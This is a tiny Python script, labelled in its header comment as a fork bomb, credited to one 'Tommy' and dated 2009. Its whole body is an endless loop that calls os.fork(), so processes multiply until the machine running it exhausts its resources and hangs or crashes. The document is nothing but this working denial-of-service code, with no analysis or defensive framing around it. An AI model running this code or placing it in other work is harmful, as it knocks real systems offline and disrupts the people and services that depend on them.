#!/usr/bin/env python

# fork bomb - python version
#
# Author: Tommy
# Date: 2009-10-03 18:50

import os

while True:
	os.fork()
	